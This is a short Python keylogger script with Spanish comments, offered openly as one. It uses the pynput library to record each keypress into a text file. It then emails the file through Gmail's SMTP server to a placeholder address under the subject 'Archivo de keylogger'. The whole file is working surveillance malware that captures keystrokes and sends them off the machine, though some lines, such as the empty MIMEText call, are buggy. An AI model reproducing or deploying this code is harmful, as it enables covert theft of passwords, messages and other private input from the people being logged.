import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from pynput  import keyboard


teclas_presionadas = {}
#crear archivo
archivo = open("nombre del archivo.txt", "a")

#mirar que se esta presionando 
def on_press(key):
    try:
        print(f"Tecla presionada: {key.char}")
        with open("nombre del archivo.txt", "a") as archivo:
            archivo.write(f"{key.char}")
            archivo.flush()
#si no es una tecla comun, entonces es una tecla especial
    except AttributeError:
        print(f"Tecla especial presionada: {key}")
        with open("nombre del archivo.txt", "a") as archivo:
            archivo.write(f" ")
            archivo.flush()
        #salir del programa
def on_release(key):
       if key == keyboard.Key.esc:
        
        return False
#crear archivo si no lo esta, por asegurar
with open("nombre del archivo.txt", "a") as archivo:
    pass
#escucha activa
listener = keyboard.Listener(on_press=on_press, on_release=on_release) 
listener.start()
listener.join()



#Enviar por correo 

gmail_user = 'tu correo'
gmail_password = 'tu contraseña'
destinatario = 'correo para el archivo'
asunto = 'Archivo de keylogger'
cuerpo = ''
#construir mensaje 
msg = MIMEMultipart()
msg['Subject'] = asunto
msg['From'] = gmail_user
msg['To'] = destinatario
#
msg.attach(MIMEText())

#archivo adjunto

archivo_adjunto = 'nombre del archivo.txt'
with open(archivo_adjunto, 'rb') as f:
    adjunto = MIMEApplication (f.read())
    adjunto.add_header('content', 'attachment', filename=archivo_adjunto)
    msg.attach(adjunto)
 #conectar con server
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(gmail_user, gmail_password)
server.sendmail(gmail_user, destinatario, msg.as_string())
server.quit()
